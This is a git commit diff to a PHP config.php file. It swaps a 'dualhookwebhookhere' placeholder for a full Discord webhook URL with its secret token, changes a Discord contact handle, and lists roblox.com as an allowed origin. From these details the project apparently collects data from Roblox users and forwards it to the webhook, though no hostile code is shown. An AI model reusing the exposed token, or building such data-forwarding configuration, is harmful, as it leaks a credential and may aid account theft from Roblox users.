8e1e753d8920e01145469f086f0d73d13be8d116
JurlyX <161505209+JurlyX@users.noreply.github.com>
2024-11-01 11:26:48 -0400

    Update config.php

--- config.php
+++ config.php
@@ -1,8 +1,8 @@
 <?php
 
 
-    $webhook = "dualhookwebhookhere";
-    $discord_contact = "veiyo#0002";
+    $webhook = "https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz";
+    $discord_contact = "xen.dexx";
     
     $allowed_origins = array(
         "https://www.roblox.com",
